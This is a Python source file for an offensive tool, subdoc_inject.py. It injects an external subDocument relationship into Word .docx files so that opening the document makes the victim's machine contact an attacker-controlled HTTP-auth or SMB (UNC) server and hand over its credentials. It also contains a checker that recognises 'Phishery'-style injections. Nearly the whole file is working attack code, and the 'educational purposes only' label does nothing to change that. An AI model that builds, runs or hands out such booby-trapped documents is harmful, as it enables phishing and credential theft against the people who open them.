#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# subdoc_inject.py: Tool to generate documents with a subdoc payload
# =============================================================================
#
#
# @hxmonsegur//RSL

# Standard libs
import sys
import os
import shutil
import tempfile
from zipfile import ZipFile, ZIP_STORED, ZipInfo
import argparse

# pip(2/3) install xmltodict
# or sudo apt install python-xmltodict

try:
    import xmltodict
except(ImportError):
    print("[!] xmltodict library not installed or found. Please install requirements")
    raise SystemExit

# Placeholder for settings.xml.rels
SETRELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
		<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
			<Relationship Id="rId{}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument"
			Target="{}"
			TargetMode="External"/>
		</Relationships>"""

class UpdateableZipFile(ZipFile):
    # Beautiful solution by: http://stackoverflow.com/a/35435548
    """
    Add delete (via remove_file) and update (via writestr and write methods)
    To enable update features use UpdateableZipFile with the 'with statement',
    Upon  __exit__ (if updates were applied) a new zip file will override the exiting one with the updates
    """

    class DeleteMarker(object):
        pass

    def __init__(self, file, mode="r", compression=ZIP_STORED, allowZip64=False):
        # Init base
        super(UpdateableZipFile, self).__init__(file, mode=mode, compression=compression, allowZip64=allowZip64)
        # track file to override in zip
        self._replace = {}
        # Whether the with statement was called
        self._allow_updates = False

    def writestr(self, zinfo_or_arcname, bytes, compress_type=None):
        if isinstance(zinfo_or_arcname, ZipInfo):
            name = zinfo_or_arcname.filename
        else:
            name = zinfo_or_arcname
        # If the file exits, and needs to be overridden,
        # mark the entry, and create a temp-file for it
        # we allow this only if the with statement is used
        if self._allow_updates and name in self.namelist():
            temp_file = self._replace[name] = self._replace.get(name, tempfile.TemporaryFile())
            temp_file.write(bytes)
        # Otherwise just act normally
        else:
            super(UpdateableZipFile, self).writestr(zinfo_or_arcname, bytes, compress_type=compress_type)

    def write(self, filename, arcname=None, compress_type=None):
        arcname = arcname or filename
        # If the file exits, and needs to be overridden,
        # mark the entry, and create a temp-file for it
        # we allow this only if the with statement is used
        if self._allow_updates and arcname in self.namelist():
            temp_file = self._replace[arcname] = self._replace.get(arcname, tempfile.TemporaryFile())
            with open(filename, "rb") as source:
                shutil.copyfileobj(source, temp_file)
        # Otherwise just act normally
        else:
            super(UpdateableZipFile, self).write(filename, arcname=arcname, compress_type=compress_type)

    def __enter__(self):
        # Allow updates
        self._allow_updates = True
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        # call base to close zip file, organically
        try:
            super(UpdateableZipFile, self).__exit__(exc_type, exc_val, exc_tb)
            if len(self._replace) > 0:
                self._rebuild_zip()
        finally:
            # In case rebuild zip failed,
            # be sure to still release all the temp files
            self._close_all_temp_files()
            self._allow_updates = False

    def _close_all_temp_files(self):
        for temp_file in self._replace.itervalues():
            if hasattr(temp_file, 'close'):
                temp_file.close()

    def remove_file(self, path):
        self._replace[path] = self.DeleteMarker()

    def _rebuild_zip(self):
        tempdir = tempfile.mkdtemp()
        try:
            temp_zip_path = os.path.join(tempdir, 'new.zip')
            with ZipFile(self.filename, 'r') as zip_read:
                # Create new zip with assigned properties
                with ZipFile(temp_zip_path, 'w', compression=self.compression, allowZip64=self._allowZip64) as zip_write:
                    for item in zip_read.infolist():
                        # Check if the file should be replaced / or deleted
                        replacement = self._replace.get(item.filename, None)
                        # If marked for deletion, do not copy file to new zipfile
                        if isinstance(replacement, self.DeleteMarker):
                            del self._replace[item.filename]
                            continue
                        # If marked for replacement, copy temp_file, instead of old file
                        elif replacement is not None:
                            del self._replace[item.filename]
                            # Write replacement to archive,
                            # and then close it (deleting the temp file)
                            replacement.seek(0)
                            data = replacement.read()
                            replacement.close()
                        else:
                            data = zip_read.read(item.filename)
                        zip_write.writestr(item, data)
            # Override the archive with the updated one
            shutil.move(temp_zip_path, self.filename)
        finally:
            shutil.rmtree(tempdir)

def analyzedoc(infile):
    try:
        with ZipFile(infile) as arc:
                if arc.namelist().__contains__('word/_rels/settings.xml.rels'):
                    print("[+] word/_rels/settings.xml.rels discovered.")
                    with arc.open('word/_rels/settings.xml.rels') as fr:
                        doc = xmltodict.parse(fr.read())
                    if doc.has_key('Relationships'):
                        if doc['Relationships']['Relationship'].has_key('@Id'):
                            if doc['Relationships']['Relationship']['@Id'] == 'rId1337':
                                print("[!] Phishery injection confirmed.")
                                tURL = doc['Relationships']['Relationship']['@Target']
                                print("[!] Target URL: {}".format(tURL))
                            else:
                                print("[!] Relationship discovered is {}".format(doc['Relationships']['Relationship']['@Id']))
                                if doc['Relationships']['Relationship'].has_key('@Target'):
                                    tURL = doc['Relationships']['Relationship']['@Target']
                                    print("[!] Target URL: {}".format(tURL))
                            return True
    except(KeyError):
        pass
    except(IOError):
        print("[-] {}: No such file".format(infile))
        raise SystemExit

    return False

def infectDoc(goodocx, badocx, url, identifier, reinfect=False):
    tempdir = tempfile.mkdtemp()
    temp_zip_path = os.path.join(tempdir, 'temp.docx')
    shutil.copy(goodocx, badocx)
    if reinfect:
        with ZipFile(badocx) as arc:
            with arc.open('word/settings.xml') as fr:
                docx = fr.read()
            oldid = docx.split('r:id=')[1].split('"')[1]
            print("[*] Replacing old ID ({}) with rId{}".format(oldid, identifier))
            settingsxml = docx.replace(oldid, "rId{}".format(identifier))
    else:
        with ZipFile(badocx) as arc:
            with arc.open('word/settings.xml') as fr:
                docx = fr.read()
            closepos = docx.index('/>')
            prepos = docx[:closepos]
            editpos = '/><w:p><w:subDoc r:id="rId{}"/></w:p>'.format(identifier)
            postpos = docx[closepos:]
            settingsxml = "{}{}{}".format(prepos, editpos, postpos)
    with UpdateableZipFile(badocx, "a") as inj:
        inj.writestr("word/settings.xml", settingsxml)
        inj.writestr("word/_rels/settings.xml.rels", SETRELS.format(identifier, url))
    print("[*] {} has been injected and output is: {}".format(goodocx, badocx))

def main():
    try:
        # Configure argument parser
        parser = argparse.ArgumentParser(
            prog='subdoc_inject.py',
            description='Inject subdoc external requests (SMB) [SE]',
            epilog='For educational purposes only. @hxmonsegur//RSL',
            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        parser.add_argument('-i', '--infile', help='docx File to inject')
        parser.add_argument('-o', '--outfile', help='Filename of the file post injection')
        parser.add_argument('-u', '--url', help='Domain pointed to HTTP_AUTH server. e.g. https://domain.com/docs/target-UUID')
        parser.add_argument('-d', '--identifier', help='Document identifier', default=100)

        # Parse arguments
        try:
            args = parser.parse_args()
        except:
            #parser.print_help()
            print("[-] Please refer to -h|--help for help")
            raise SystemExit

        if len(sys.argv) < 2:
            parser.print_help()
            raise SystemExit

        if args.infile and args.outfile:
            if not args.url:
                print("[!] Please specify listening UNC path via -u|--url")
                raise SystemExit

            print("[+] Infecting {}".format(args.infile))
            infectDoc(args.infile, args.outfile, args.url, args.identifier, False)

    except(KeyboardInterrupt):
        print("[!!] Program was interrupted (ctrl+c). Exiting...")
        raise SystemExit

if __name__ == "__main__":
    main()
